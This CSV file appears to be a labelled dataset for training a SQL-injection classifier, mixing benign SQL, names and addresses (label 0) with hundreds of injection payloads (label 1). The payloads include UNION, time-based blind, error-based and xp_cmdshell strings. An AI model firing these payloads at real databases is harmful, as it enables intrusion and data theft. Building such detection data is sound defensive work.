Query,Label
fe4r0g6ent8,0
dey,0
"1 ) as cjmt where 4839 = 4839 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1
SELECT * FROM mad WHERE Price NOT BETWEEN 10 AND 20,0
1' ) as gsjr where 7046 = 7046 and sleep ( 5 ) #,1
"1 union all select null,null,null--",1
SELECT area ( s ) FROM seems UNION ALL,0
nesime,0
gaetano,0
SELECT outline FROM worker UNION ALL SELECT start FROM soap ORDER BY dot,0
SELECT AVG ( cannot ) FROM recognize SELECT SUM ( duck ),0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'ctbs' like 'ctbs",1
hormilla,0
22440,0
"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1
SELECT * FROM garden WHERE mood BETWEEN 'possible' AND 'wood',0
"-9180"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT * FROM chapter WHERE nothing = 'time',0
"1' ) ) union all select null,null,null,null,null#",1
"1%"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
SELECT TOP 50 PERCENT * FROM compound,0
SELECT mother ( s ) FROM owner,0
gallinero de cameros,0
1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,1
"SELECT valuable, dozen, importanceFROM curve WHERE statement IS NOT NULL",0
1 ) where 6116 = 6116 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
1 ) as fhvr where 5544 = 5544,1
SELECT * FROM job FETCH FIRST 3 ROWS ONLY,0
SELECT needed ( s ) FROM sets,0
"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--",1
SELECT * FROM symbol WHERE breakfast IN ( SELECT property FROM invented ),0
"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'nuil' like 'nuil",1
SELECT * FROM heat WHERE slight = activity,0
SELECT potatoes ( s ) FROM exact FULL OUTER JOIN,0
"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""uncg"" = ""uncg",1
"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",1
-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--,1
SELECT * FROM jet WHERE substance BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( Price ) AS AveragePrice FROM Products;,0
SELECT * FROM folks WHERE activity IN ( SELECT frozen FROM did ),0
1' ) as xwlf where 9424 = 9424,1
"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1
SELECT * FROM neighbor WHERE green NOT LIKE 'important%',0
"1%"" ) ) ) rlike sleep ( 5 ) #",1
"-9361"" ) ) union all select 3112#",1
"SELECT column_name ( s ) FROM drink,bank",0
SELECT COUNT ( DISTINCT play ) FROM ate,0
"1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1
SELECT * FROM nothing WHERE social = 'simply' LIMIT 3,0
SELECT * FROM matter WHERE identity BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT column1, column2,... FROM existing_table_name WHERE ....; CREATE TABLE TestTable AS",0
as,1
zohar@pablobracamonte.bh,0
"-7793"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""lias"" = ""lias",1
SELECT fallen ( s ) FROM roll,0
-8753 ) order by 1#,1
&apos; OR,1
SELECT * FROM before WHERE monkey NOT LIKE 'screen%',0
"calle abeto, 187,",0
"-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,1
SELECT compare ( s FROM supply RIGHT JOIN,0
SELECT COUNT ( * ) FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_file\\_sync\\_1\\_batch\\_%',0
SELECT knew ( s ) FROM know SELECT darkness ( s ),0
277,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'bzxo' like 'bzxo",1
SELECT * FROM sum WHERE NOT especially = 'opportunity',0
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 6824 = 6824,1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""snwx"" like ""snwx",1
"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cbwx' = 'cbwx",1
3820,0
"1' ) as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1
SELECT MIN ( sunlight ) AS shoot FROM quietly,0
SELECT * FROM excellent FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM western,0
"1 or elt ( 6272 = 6272,sleep ( 5 ) ) # klaw",1
"-4849"" ) ) or ( 5005 = 9111 ) *9111 and ( ( ""catv"" like ""catv",1
"1 ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
46177,0
"1"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""ureu"" like ""ureu",1
"SELECT * FROM negative WHERE vegetable BETWEEN ""cookies"" AND ""needed""",0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id = 2710",0
"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'kyxl' = 'kyxl",1
"SELECT partyID AS ID, told AS wind FROM lead",0
lanae,0
SELECT MIN ( Price ) AS SmallestPrice FROM Products;,0
"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",1
select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from information_schema.character_sets ) end ) #,1
"-1168 ) ) as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
eccles@aspirantes.gh,0
SELECT * FROM courage WHERE unknown LIKE '%steep%',0
78608268h,0
contreras,0
chilln,0
SELECT * FROM frozen WHERE NOT crowd = 'forward' AND NOT nor = 'soil',0
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'istb' = 'istb",1
-1432 order by 1#,1
"-9136%"" ) union all select 3081,3081,3081,3081,3081,3081,3081#",1
"1 ) ) and elt ( 9288 = 6067,6067 ) and ( ( 1895 = 1895",1
guisset melo,0
"1' ) as uytv where 7875 = 7875 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1' ) as jxtg where 1071 = 1071 and sleep ( 5 ) --,1
"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
select pg_sleep ( 5 ) ) +',1
arceo feliu,0
48710,0
1'+ ( select iutk where 6158 = 6158,1
"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'nlfl' like 'nlfl",1
"-5731"" union all select 3083,3083,3083#",1
"1'+ ( select vohg where 6383 = 6383 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +'",1
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'jueq' = 'jueq",1
"1 ) where 1270 = 1270 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
SELECT AVG ( whom ) FROM having SELECT SUM ( sweet ),0
5469,0
1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 4574 = 4574,1
1984,0
"SELECT adult, just, slowFROM agree WHERE go IS NOT NULL",0
"SELECT * FROM hardly WHERE gradually NOT IN ( 'trick', 'gold', 'tongue' )",0
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq,1
select ( case when ( 8234 = 2498 ) then 8234 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
select case when 3920 = 4402 then 1 else null end--,1
"1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT COUNT ( report ) FROM memory,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 365884 ) ORDER BY meta_id ASC",0
"1'|| ( select 'ypil' from dual where 4568 = 4568 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1
"1' ) as irsh where 4973 = 4973 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
lombardo,0
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
"1%"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,1
"UPDATE partly SET safety = 'shape', City = 'raise' WHERE throughout = same",0
subidor,0
6u33a,0
"-7499%"" ) union all select 1893,1893,1893,1893,1893#",1
1'+ ( select cxvy where 7421 = 7421,1
"-1550' in boolean mode ) union all select 9777,9777,9777--",1
a8o8decer,0
"1"" where 7232 = 7232 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1
SELECT * FROM birds,0
"1"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT * FROM without WHERE car = 'especially' OR tears = 'southern',0
SELECT straw FROM valley UNION SELECT world FROM snow ORDER BY represent,0
SELECT * FROM spring,0
45634,0
SELECT thumb ( s ) FROM element INNER JOIN,0
SELECT * FROM experiment WHERE height = 'other' AND City = 'red',0
"SELECT Orders.futurerID, Employees.height, Employees.blow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.tryID ORDER BY Orders.olderID",0
SELECT TOP 3 * FROM oxygen WHERE writer = 'pan',0
SELECT * FROM area,0
"1 ) as wype where 6608 = 6608 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM product WHERE NOT closely = 'lion' AND NOT far = 'sink',0
"1 ) where 7588 = 7588 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1' ) ) as zqeg where 4729 = 4729 and ( 1098 = 9682 ) *9682--,1
mairena,0
-1396 where 5838 = 5838 or 9323 = 9323#,1
1 ) ) as epfz where 5471 = 5471,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1
SELECT * FROM clay FETCH FIRST 50 PERCENT ROWS ONLY,0
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- gkcl",1
SELECT allow ( s ) FROM exciting SELECT flew ( s ),0
"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'vpus' = 'vpus",1
konstanc,0
perendengue,0
1.94E+15,0
6.92E+15,0
"1 ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 6010 = 6010",1
"calle pinos los 128,",0
"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'nazb' = 'nazb",1
SELECT AVG ( cookies ) FROM branch SELECT SUM ( property ),0
"INSERT INTO high ( straw, fire, spring ) VALUES ( 'amount', 'tried', 'boy' )",0
tesisteco avi,0
1'+ ( select zpdf where 2938 = 2938,1
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0
SELECT * FROM [Brazil Customers]; CREATE VIEW [Products Above Average Price] AS,0
"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
select ( case when ( 9318 = 7198 ) then 9318 else 9318* ( select 9318 from information_schema.character_sets ) end ) #,1
SELECT mostly FROM expect UNION ALL SELECT related FROM finish ORDER BY pipe,0
"1"" ) waitfor delay '0:0:5' and ( ""vjpg"" = ""vjpg",1
"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""xhvo"" = ""xhvo",1
-1304' ) union all select 7639#,1
"-7715' ) union all select 4830,4830,4830,4830,4830,4830,4830,4830--",1
villalgordo del marquesado,0
"-3979' in boolean mode ) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1
SELECT north ( s ) FROM team UNION,0
SELECT * FROM ball WHERE bar = 'nearly' OR whatever = 'advice',0
SELECT * FROM mainly WHERE alike = 'map' LIMIT 3,0
20120,0
SELECT entire,0
7.96693E+15,0
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 1321 = 1321",1
SELECT * FROM are WHERE bush = 'particular' OR metal = 'party',0
"1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """,1
"pl. francisca pacheco, 81",0
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0
"waitfor delay '0:0:5' and ""lhcv"" = ""lhcv",1
SELECT * FROM recent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM settlers,0
"c/ rio cidacos, 13",0
SELECT * FROM younger WHERE cabin BETWEEN 10 AND 20,0
SELECT COUNT ( reportID ) FROM swimming,0
"1 ) ) as nnpe where 9720 = 9720 union all select null,null,null,null,null,null,null,null,null#",1
"SELECT eventuallyID AS ID, huge AS stuck FROM lay",0
"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )",1
"-9891"" union all select 7489#",1
"-4679 where 9634 = 9634 union all select 9634,9634,9634,9634,9634,9634,9634--",1
0i26or7os9,0
"1 ) ) as oywa where 7951 = 7951 union all select null,null,null,null,null,null#",1
"1%"" union all select null--",1
SELECT ready ( s ) FROM tight LEFT JOIN,0
"SELECT definition,off,opportunity FROM beneath LEFT JOIN Orders ON cold.appleID = surface.attempt ORDER BY evening.trap",0
SELECT visit ( s ) FROM service UNION,0
SELECT * FROM stomach WHERE Price NOT BETWEEN 10 AND 20,0
"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1
SELECT * FROM test FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM easier,0
thuong,0
SELECT heading,0
else dbms_lock.sleep ( 0 ),1
SELECT * FROM wide WHERE upward NOT LIKE '[deep]%',0
SELECT AVG ( strange ) FROM excited,0
"1%' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( '%' = '",1
UPDATE duty SET pocket = 'closely'WHERE product = 'press',0
1'|| ( select 'cfff' where 4994 = 4994,1
"1 ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 8294 = 8294",1
SELECT Count ( * ) AS wish,0
SELECT * FROM mirror WHERE attached BETWEEN '1996-07-01' AND '1996-07-31',0
"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn",1
"1 ) as rnfb where 2405 = 2405 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',0
select ( case when ( 7385 = 8723 ) then 7385 else 7385* ( select 7385 from information_schema.character_sets ) end ) #,1
4107,0
SELECT COUNT ( news ) FROM lamp,0
"1'|| ( select 'jlka' where 5436 = 5436 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"SELECT cent, cool, bareFROM anybody WHERE drop IS NOT NULL",0
"SELECT Employees.nails, COUNT ( Orders.paragraphID ) AS soapFROM ( OrdersINNER JOIN sometime ON Orders.rulerID = Employees.danceID )",0
"1'+ ( select thmg where 2546 = 2546 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
ivey,0
1 ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 1260 = 1260,1
"robert graves, 101",0
"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
"SELECT Orders.seriesrID, Employees.leg, Employees.serve FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.trainID ORDER BY Orders.briefID",0
1 where 4844 = 4844,1
jndula couttolenc,0
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'foju' = 'foju,1
select ( case when ( 8663 = 7467 ) then 8663 else 1/ ( select 0 ) end ) --,1
"1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline",0
SELECT TIME ( NULL ) ;,0
SELECT * FROM constantly,0
SELECT * FROM breeze WHERE night = 'box' FETCH FIRST 3 ROWS ONLY,0
"SELECT LOCATE ( ""com"", ""W3Schools.com"", 3 ) AS MatchPosition;",0
SELECT * FROM lack WHERE shine BETWEEN 'already' AND 'blow',0
-8966%' or ( 7475 = 4014 ) *4014 and '%' = ',1
"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""stcv"" = ""stcv",1
SELECT AVG ( suddenly ) FROM flame SELECT SUM ( began ),0
"-6086"" union all select 8700,8700,8700,8700--",1
"1"" ) where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1
"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party ) VALUES ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )",0
"SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN ( 28341,28313 ) AND wp_posts.post_type = 'houzez_agent' AND ( ( wp_posts.post_status 'trash' AND wp_posts.post_status 'auto-draft' AND wp_posts.post_status 'flamingo-spam' ) ) ORDER BY wp_posts.post_date DESC",0
"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,1
"1' ) as ljpy where 8270 = 8270 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
4014,0
siu-ling,0
"1"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT * FROM nervous WHERE sign = 'shade',0
"-2197' union all select 8065,8065,8065,8065--",1
select ( case when ( 2394 = 4530 ) then 2394 else 2394* ( select 2394 from information_schema.character_sets ) end ) #,1
1' ) ) ) and 9198 = 9198--,1
carteado,0
"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'mvkg' = 'mvkg",1
SELECT store ( s ) FROM bare INNER JOIN,0
arnaldo,0
SELECT curious ( s ) FROM pencil,0
"SELECT * FROM sheet WHERE stems BETWEEN ""watch"" AND ""climb""",0
"1' ) ) as bwjl where 8538 = 8538 union all select null,null,null,null,null,null,null#",1
handler,1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1
SELECT * FROM condition WHERE basis BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( rest ) FROM toy SELECT SUM ( be ),0
SELECT * FROM by WHERE NOT giant = 'school',0
"SELECT hand, cook+ ', ' + audience+ ' ' + main+ ', ' + avoid AS adventure FROM acres",0
"SELECT column_name ( s ) FROM magnet,cannot",0
"-1390%"" ) ) union all select 8930,8930,8930,8930,8930#",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
"1"" where 4445 = 4445 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1
"union ( select NULL, ( select @@version ) ) --",1
"campello, el",0
"-7544"" ) ) union all select 3808,3808,3808,3808--",1
terhune@multireform.tn,0
"-2373%"" ) or 9323 = 9323#",1
lloros*o,0
"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",1
3.07443E+15,0
if ( 8264 = 1939 ) select 8264 else drop function nsoq--,1
-2530%' order by 1#,1
-6039%' ) ) or 6872 = 6872 and ( ( '%' = ',1
villavendimio,0
rached,0
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( Price ) FROM applied,0
"SELECT * FROM research WHERE till NOT IN ( 'production', 'winter', 'burst' )",0
"-7714 where 9768 = 9768 union all select 9768,9768--",1
1' and 7533 = 7533 and 'clqy' like 'clqy,1
"1' union all select null,null,null,null,null,null,null#",1
"-6017 union all select 8449,8449,8449--",1
oblong0,0
"c/ el jacinto, 132,",0
"1' ) where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1
10560589r,0
SELECT AVG ( range ) FROM position SELECT SUM ( silver ),0
SELECT branch FROM basic,0
SELECT keep FROM cow,0
SELECT DISTINCT circle FROM activity,0
SELECT * FROM process WHERE eight = 'spell',0
1%' ) ) ) and 1661 = 7683,1
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
SELECT AVG ( hay ) FROM late SELECT SUM ( smell ),0
"SELECT product AS wonder, connected AS [herd] FROM lunch",0
' AND (SELECT LENGTH(user) FROM dual)=5 --,1
"-7971 ) ) as armw where 9474 = 9474 or make_set ( 9354 = 9354,7185 ) --",1
samardzic.carafotes@bruoseguridad.je,0
1%' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1
"SELECT even,winter,various,team,two ( ( needle JOIN wet ON example.carry = would.worker ) INNER JOIN nearbyON Orders.feel = clay.magicID )",0
"SELECT * FROM nervous ORDER BY powerful ASC, rear DESC",0
"select * from users where id = '1' + @ 1! union select 1,version ( ) -- 1'",1
"1 ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1"" ) where 5298 = 5298 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1
SELECT * FROM salt WHERE flower = 'occasionally' OR same = 'crack',0
1'+ ( select 'yahq' where 6974 = 6974 union all select null--,1
"SELECT * FROM own ORDER BY highest, improve",0
"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'luoj' = 'luoj",1
